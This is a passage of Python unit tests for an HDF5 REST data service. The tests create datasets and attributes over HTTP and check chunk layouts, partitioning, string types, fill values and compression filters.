        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # verify layout
        req = helper.getEndpoint() + "/datasets/" + dset_uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("layout" in rspJson)
        layout_json = rspJson["layout"]
        self.assertTrue("class" in layout_json)
        self.assertEqual(layout_json["class"], 'H5D_CHUNKED')
        self.assertTrue("dims" in layout_json)
        layout = layout_json["dims"]
        self.assertEqual(len(layout), 2)
        self.assertTrue(layout[0] < dims[0])
        self.assertTrue(layout[1] < dims[1])
        chunk_size = layout[0] * layout[1] * 4
        # chunk size should be between chunk min and max
        self.assertTrue(chunk_size >= CHUNK_MIN)
        self.assertTrue(chunk_size <= CHUNK_MAX) 
**************************************
def testMinChunkSizeDataset(self):
        # test Dataset where chunk layout is adjusted if provided
        # layout is too small
        domain = self.base_domain + "/testMinChunkSizeDataset.h5"
        helper.setupDomain(domain)
        print("testMinChunkSizeDataset", domain)
        headers = helper.getRequestHeaders(domain=domain)
        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)
        root_uuid = rspJson["root"]

        # create the dataset
        req = self.endpoint + "/datasets"
        # 50K x 80K dataset
        dims = [50000, 80000]
        payload = {'type': 'H5T_IEEE_F32LE', 'shape': dims }
        # define a chunk layout with lots of small chunks
        payload['creationProperties'] = {'layout': {'class': 'H5D_CHUNKED', 'dims': [10, 10] }}

        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)
        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link new dataset as 'dset'
        name = 'dset'
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # verify layout
        req = helper.getEndpoint() + "/datasets/" + dset_uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("layout" in rspJson)
        layout_json = rspJson["layout"]
        self.assertTrue("class" in layout_json)
        self.assertEqual(layout_json["class"], 'H5D_CHUNKED')
        self.assertTrue("dims" in layout_json)
        layout = layout_json["dims"]
        self.assertEqual(len(layout), 2)
        self.assertTrue(layout[0] < dims[0])
        self.assertTrue(layout[1] < dims[1])
        chunk_size = layout[0] * layout[1] * 4
        # chunk size should be between chunk min and max
        self.assertTrue(chunk_size >= CHUNK_MIN)
        self.assertTrue(chunk_size <= CHUNK_MAX) 
**************************************
def testContiguousRefDataset(self):
        # test Dataset where H5D_CONTIGUOUS_REF layout is used
        domain = self.base_domain + "/testContiguousRefDataset.h5"
        helper.setupDomain(domain)
        print("testContiguousRefDataset", domain)
        headers = helper.getRequestHeaders(domain=domain)
        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)
        root_uuid = rspJson["root"]

        # create the dataset
        req = self.endpoint + "/datasets"
        # 50K x 80K dataset
        dims = [50000, 8000000]
        payload = {'type': 'H5T_IEEE_F32LE', 'shape': dims }
        file_uri = "s3://a-storage-bucket/some-file.h5"

        offset = 1234
        size = dims[0] * dims[1] * 4  # uncompressed size

        payload['creationProperties'] = {'layout': {'class': 'H5D_CONTIGUOUS_REF', 'file_uri': file_uri, 'offset': offset, 'size': size }}
        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)

        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link new dataset as 'dset'
        name = 'dset'
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # verify layout
        req = helper.getEndpoint() + "/datasets/" + dset_uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("layout" in rspJson)
        layout_json = rspJson["layout"]
        self.assertTrue("class" in layout_json)
        self.assertEqual(layout_json["class"], 'H5D_CONTIGUOUS_REF')
        self.assertEqual(layout_json["file_uri"], file_uri)
        self.assertEqual(layout_json["offset"], offset)
        self.assertEqual(layout_json["size"], size)
        self.assertTrue("dims" in layout_json)
        chunk_dims = layout_json["dims"]
        self.assertEqual(len(chunk_dims), 2)
        chunk_size = chunk_dims[0] * chunk_dims[1] * 4
        # chunk size should be between chunk min and max
        self.assertTrue(chunk_size >= CHUNK_MIN)
        self.assertTrue(chunk_size <= CHUNK_MAX) 
**************************************
def testDatasetChunkPartitioning(self):
        # test Dataset partitioning logic for large datasets
        domain = self.base_domain + "/testDatasetChunkPartitioning.h5"
        helper.setupDomain(domain)
        print("testDatasetChunkPartitioning", domain)
        headers = helper.getRequestHeaders(domain=domain)
        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)
        root_uuid = rspJson["root"]

        # create the dataset
        req = self.endpoint + "/datasets"
        # 50K x 80K x 90K dataset
        dims = [50000, 80000, 90000]
        payload = {'type': 'H5T_IEEE_F32LE', 'shape': dims }

        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)

        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link new dataset as 'dset'
        name = 'dset'
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # verify layout
        req = helper.getEndpoint() + "/datasets/" + dset_uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("layout" in rspJson)
        layout_json = rspJson["layout"]
        self.assertTrue("class" in layout_json)
        self.assertEqual(layout_json["class"], 'H5D_CHUNKED')
        self.assertTrue("dims" in layout_json)
        self.assertTrue("partition_count" in layout_json)
        self.assertTrue(layout_json["partition_count"] > 1000)  # will change if max_chunks_per_folder is updated

        layout = layout_json["dims"]

        self.assertEqual(len(layout), 3)
        self.assertTrue(layout[0] < dims[0])
        self.assertTrue(layout[1] < dims[1])
        self.assertTrue(layout[2] < dims[2])
        chunk_size = layout[0] * layout[1] * layout[2] * 4
        # chunk size should be between chunk min and max
        self.assertTrue(chunk_size >= CHUNK_MIN)
        self.assertTrue(chunk_size <= CHUNK_MAX) 
**************************************
def testExtendibleDatasetChunkPartitioning(self):
        # test Dataset partitioning logic for large datasets
        domain = self.base_domain + "/testExtendibleDatasetChunkPartitioning.h5"
        helper.setupDomain(domain)
        print("testExtendibleDatasetChunkPartitioning", domain)
        headers = helper.getRequestHeaders(domain=domain)
        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)
        root_uuid = rspJson["root"]

        # create the dataset
        req = self.endpoint + "/datasets"
        # 50K x 80K x 90K dataset
        dims = [0, 80000, 90000]
        # unlimited extend in dim 0, fixeed in dimension 2, extenbile by 10x in dim 3
        max_dims = [0,80000,900000]
        payload = {'type': 'H5T_IEEE_F32LE', 'shape': dims, 'maxdims': max_dims }

        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)

        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link new dataset as 'dset'
        name = 'dset'
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # verify layout
        req = helper.getEndpoint() + "/datasets/" + dset_uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("layout" in rspJson)
        layout_json = rspJson["layout"]
        self.assertTrue("class" in layout_json)
        self.assertEqual(layout_json["class"], 'H5D_CHUNKED')
        self.assertTrue("dims" in layout_json)
        self.assertTrue("partition_count" in layout_json)

        layout = layout_json["dims"]

        self.assertEqual(len(layout), 3)
        chunk_size = layout[0] * layout[1] * layout[2] * 4
        # chunk size should be between chunk min and max
        self.assertTrue(chunk_size >= CHUNK_MIN)
        self.assertTrue(chunk_size <= CHUNK_MAX) 
**************************************
def testPutVLenInt(self):
        # Test PUT value for 1d attribute with variable length int types
        print("testPutVLenInt", self.base_domain)

        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        # Get root uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        # create dataset
        vlen_type = {"class": "H5T_VLEN", "base": { "class": "H5T_INTEGER", "base": "H5T_STD_I32LE"}}
        payload = {'type': vlen_type, 'shape': [4,]}
        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)
        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link new dataset as 'dset'
        name = 'dset'
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # write values to dataset
        data = [[1,], [1,2], [1,2,3], [1,2,3,4]]
        req = self.endpoint + "/datasets/" + dset_uuid + "/value"
        payload = { 'value': data }
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 200)

        # read values from dataset
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        value = rspJson["value"]
        self.assertEqual(len(value), 4)
        for i in range(4):
            self.assertEqual(value[i], data[i])

        # read back a selection
        params = {"select": "[2:3]"}
        rsp = requests.get(req, headers=headers, params=params)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        value = rspJson["value"]
        self.assertEqual(len(value), 1)
        self.assertEqual(value[0], data[2]) 
**************************************
def testPutVLenString(self):
        # Test PUT value for 1d attribute with variable length string types
        print("testPutVLenString", self.base_domain)

        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        # Get root uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        # create dataset
        vlen_type =  {"class": "H5T_STRING", "charSet": "H5T_CSET_ASCII",
                    "strPad": "H5T_STR_NULLTERM", "length": "H5T_VARIABLE"}
        payload = {'type': vlen_type, 'shape': [4,]}
        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)
        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link new dataset as 'dset'
        name = 'dset'
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # write values to dataset
        data = ["This is", "a variable length", "string", "array"]
        req = self.endpoint + "/datasets/" + dset_uuid + "/value"
        payload = { 'value': data }
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 200)

        # read values from dataset
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        value = rspJson["value"]
        self.assertEqual(len(value), 4)
        for i in range(4):
            self.assertEqual(value[i], data[i]) 
**************************************
def testPutScalarDataset(self):
        # Test read/write to scalar dataset
        print("testPutScalarDataset", self.base_domain)

        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        # Get root uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        # create a dataset obj
        str_type = { 'charSet':   'H5T_CSET_ASCII',
                     'class':  'H5T_STRING',
                     'strPad': 'H5T_STR_NULLPAD',
                     'length': 40}
        data = { "type": str_type}
        req = self.endpoint + '/datasets'
        rsp = requests.post(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        self.assertEqual(rspJson["attributeCount"], 0)
        dset_id = rspJson["id"]
        self.assertTrue(helper.validateId(dset_id))

        # link new dataset as 'dset_scalar'
        name = "dset_scalar"
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_id}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # read unintialized value from dataset
        req = self.endpoint + "/datasets/" + dset_id + "/value"
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], '')

        # write to the dataset
        data = "Hello, world"
        payload = { 'value': data }
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 200)

        # read back the value
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], "Hello, world") 
**************************************
def testNullSpaceDataset(self):
        # Test attempted read/write to null space dataset
        print("testNullSpaceDataset", self.base_domain)

        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        # Get root uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        # create a dataset obj
        str_type = { 'charSet':   'H5T_CSET_ASCII',
                     'class':  'H5T_STRING',
                     'strPad': 'H5T_STR_NULLPAD',
                     'length': 40}
        data = { "type": str_type, 'shape': 'H5S_NULL'}
        req = self.endpoint + '/datasets'
        rsp = requests.post(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        dset_id = rspJson["id"]
        self.assertTrue(helper.validateId(dset_id))

        # link new dataset as 'dset_null'
        name = "dset_null"
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_id}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # try reading from the dataset
        req = self.endpoint + "/datasets/" + dset_id + "/value"
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 400)

        # try writing to the dataset
        data = "Hello, world"
        payload = { 'value': data }
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 400) 
**************************************
def testSimpleTypeFillValue(self):
        # test Dataset with simple type and fill value
        print("testSimpleTypeFillValue", self.base_domain)
        headers = helper.getRequestHeaders(domain=self.base_domain)

        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)
        root_uuid = rspJson["root"]

        # create the dataset
        req = self.endpoint + "/datasets"
        payload = {'type': 'H5T_STD_I32LE', 'shape': 10}
        creation_props = {'fillValue': 42 }
        payload['creationProperties'] = creation_props

        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)
        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link new dataset as 'dset'
        name = 'dset'
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # read back the data
        req = self.endpoint + "/datasets/" + dset_uuid + "/value"
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], [42,]*10)

        # write some values
        payload = { 'start': 0, 'stop': 5, 'value': [24,]*5 }
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 200)

        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        ret_values = rspJson["value"]
        for i in range(5):
            self.assertEqual(ret_values[i], 24)
            self.assertEqual(ret_values[i+5], 42) 
**************************************
def testDeflateCompression(self):
        # test Dataset with creation property list
        print("testDefalteCompression", self.base_domain)
        headers = helper.getRequestHeaders(domain=self.base_domain)
        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)
        root_uuid = rspJson["root"]

        # create the dataset
        req = self.endpoint + "/datasets"

        # Create ~1MB dataset

        payload = {'type': 'H5T_STD_I8LE', 'shape': [1024, 1024]}
        # define deflate compression
        gzip_filter = {'class': 'H5Z_FILTER_DEFLATE', 'id': 1, 'level': 9, 'name': 'deflate'}
        payload['creationProperties'] = {'filters': [gzip_filter,] }
        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)
        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link new dataset as 'dset'
        name = 'dset'
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # write a horizontal strip of 22s
        req = self.endpoint + "/datasets/" + dset_uuid + "/value"
        data = [22,] * 1024
        payload = { 'start': [512, 0], 'stop': [513, 1024], 'value': data }
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 200)

        # read back the 512,512 element
        req = self.endpoint + "/datasets/" + dset_uuid + "/value"  # test
        params = {"select": "[512:513,512:513]"} # read  1 element
        rsp = requests.get(req, params=params, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        value = rspJson["value"]
        self.assertEqual(len(value), 1)
        row = value[0]
        self.assertEqual(len(row), 1)
        self.assertEqual(row[0], 22) 
**************************************
def testShuffleFilter(self):
        # test Dataset with creation property list
        print("testShuffleFilter", self.base_domain)
        headers = helper.getRequestHeaders(domain=self.base_domain)
        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)
        root_uuid = rspJson["root"]

        # create the dataset
        req = self.endpoint + "/datasets"

        # Create ~4MB dataset

        payload = {'type': 'H5T_STD_I32LE', 'shape': [1024, 1024]}
        # define sshufle compression
        shuffle_filter = {'class': 'H5Z_FILTER_SHUFFLE', 'id': 2, 'name': 'shuffle'}
        payload['creationProperties'] = {'filters': [shuffle_filter,] }
        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)
        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link new dataset as 'dset'
        name = 'dset'
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # write a horizontal strip of 22s
        req = self.endpoint + "/datasets/" + dset_uuid + "/value"
        data = [22,] * 1024
        payload = { 'start': [512, 0], 'stop': [513, 1024], 'value': data }
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 200)

        # read back the 512,512 element
        req = self.endpoint + "/datasets/" + dset_uuid + "/value"  # test
        params = {"select": "[512:513,512:513]"} # read  1 element
        rsp = requests.get(req, params=params, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        value = rspJson["value"]
        self.assertEqual(len(value), 1)
        row = value[0]
        self.assertEqual(len(row), 1)
        self.assertEqual(row[0], 22) 
**************************************
def testLargeCreationProperties(self):
        # test Dataset with artifically large creation_properties data
        print("testLargeCreationProperties", self.base_domain)
        headers = helper.getRequestHeaders(domain=self.base_domain)

        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)
        root_uuid = rspJson["root"]

        # create the dataset
        req = self.endpoint + "/datasets"
        payload = {'type': 'H5T_STD_I32LE', 'shape': 10}
        creation_props = {'fillValue': 42 }
        foo_bar = {}
        for i in range(500):
            foo_bar[i] = f"this is a test {i}"
        creation_props['foo_bar'] = foo_bar

        payload['creationProperties'] = creation_props

        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)
        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link new dataset as 'dset'
        name = 'dset'
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # read back the data
        req = self.endpoint + "/datasets/" + dset_uuid + "/value"
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], [42,]*10)

        # write some values
        payload = { 'start': 0, 'stop': 5, 'value': [24,]*5 }
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 200)

        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        ret_values = rspJson["value"]
        for i in range(5):
            self.assertEqual(ret_values[i], 24)
            self.assertEqual(ret_values[i+5], 42) 
**************************************
def testNullShapeAttr(self):
        print("testNullShapeAttr", self.base_domain)
        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = helper.getEndpoint() + '/'

        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        attr_name = "attr_null_shape"
        attr_payload = {'type': 'H5T_STD_I32LE', 'shape': 'H5S_NULL', 'value': 42}
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        rsp = requests.put(req, headers=headers, data=json.dumps(attr_payload))
        self.assertEqual(rsp.status_code, 400)  # can't include data

        # try again without the data
        attr_payload = {'type': 'H5T_STD_I32LE', 'shape': 'H5S_NULL'}
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        rsp = requests.put(req, headers=headers, data=json.dumps(attr_payload))
        self.assertEqual(rsp.status_code, 201)  # Created

        # read back the attribute
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)  # OK
        rspJson = json.loads(rsp.text)
        self.assertTrue("name" in rspJson)
        self.assertEqual(rspJson["name"], attr_name)
        self.assertTrue("type" in rspJson)
        attr_type = rspJson["type"]
        self.assertEqual(attr_type["base"], "H5T_STD_I32LE")
        self.assertTrue("hrefs" in rspJson)
        self.assertEqual(len(rspJson["hrefs"]), 3)
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], None)
        self.assertTrue("shape" in rspJson)
        attr_shape = rspJson["shape"]
        self.assertTrue("class" in attr_shape)
        self.assertEqual(attr_shape["class"], "H5S_NULL")

        # read value should fail with 400
        rsp = requests.get(req+"/value", headers=headers)
        self.assertEqual(rsp.status_code, 400)  # Bad Request 
**************************************
def testNoShapeAttr(self):
        print("testNoShapeAttr", self.base_domain)
        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = helper.getEndpoint() + '/'

        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        attr_name = "attr_no_shape"
        attr_payload = {'type': 'H5T_STD_I32LE'}
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        rsp = requests.put(req, headers=headers, data=json.dumps(attr_payload))
        self.assertEqual(rsp.status_code, 201)  # created


        # read back the attribute
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)  # OK
        rspJson = json.loads(rsp.text)
        self.assertTrue("name" in rspJson)
        self.assertEqual(rspJson["name"], attr_name)
        self.assertTrue("type" in rspJson)
        attr_type = rspJson["type"]
        self.assertEqual(attr_type["base"], "H5T_STD_I32LE")
        self.assertTrue("hrefs" in rspJson)
        self.assertEqual(len(rspJson["hrefs"]), 3)
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], None)
        self.assertTrue("shape" in rspJson)
        attr_shape = rspJson["shape"]
        self.assertTrue("class" in attr_shape)
        self.assertEqual(attr_shape["class"], "H5S_SCALAR")
        self.assertFalse("dims" in attr_shape)

        # read value should return None
        rsp = requests.get(req+"/value", headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], None) 
**************************************
def testPutFixedStringNullTerm(self):
        # Test PUT value for 1d attribute with fixed length string/null terminated types
        print("testPutFixedStringNullTerm", self.base_domain)

        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        # Get root uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        # create attr
        text = "I'm an ASCII null terminated string"
        text_length = len(text) + 1
        fixed_str_type = {
                "charSet": "H5T_CSET_ASCII",
                "class": "H5T_STRING",
                "length": text_length,
                "strPad": "H5T_STR_NULLTERM" }
        scalar_shape = { "class": "H5S_SCALAR" }
        data = { "type": fixed_str_type, "shape": scalar_shape,
            "value": text}
        attr_name = "str_attr"
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        rsp = requests.put(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # read attr
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], text)
        self.assertTrue("type" in rspJson)
        type_json = rspJson["type"]
        self.assertTrue("class" in type_json)
        self.assertEqual(type_json["class"], "H5T_STRING")
        self.assertTrue("length" in type_json)
        self.assertEqual(type_json["length"], text_length)
        self.assertTrue("strPad" in type_json)
        self.assertEqual(type_json["strPad"], "H5T_STR_NULLTERM")
        self.assertTrue("charSet" in type_json)
        self.assertEqual(type_json["charSet"], "H5T_CSET_ASCII") 
**************************************
def testPutVLenUTF8String(self):
        # Test PUT value for 1d attribute with fixed length UTF-8 string
        print("testPutFixedUTF8String", self.base_domain)

        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        # Get root uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        # create attr
        text = "I'm an UTF-8 null terminated string"
        text_length = len(text) + 1
        fixed_str_type = {
                "charSet": "H5T_CSET_UTF8",
                "class": "H5T_STRING",
                "length": text_length,
                "strPad": "H5T_STR_NULLTERM" }
        variable_str_type = {
                "charSet": "H5T_CSET_UTF8",
                "class": "H5T_STRING",
                "length": "H5T_VARIABLE",
                "strPad": "H5T_STR_NULLTERM" }
        scalar_shape = { "class": "H5S_SCALAR" }
        data = { "type": fixed_str_type, "shape": scalar_shape,
            "value": text}
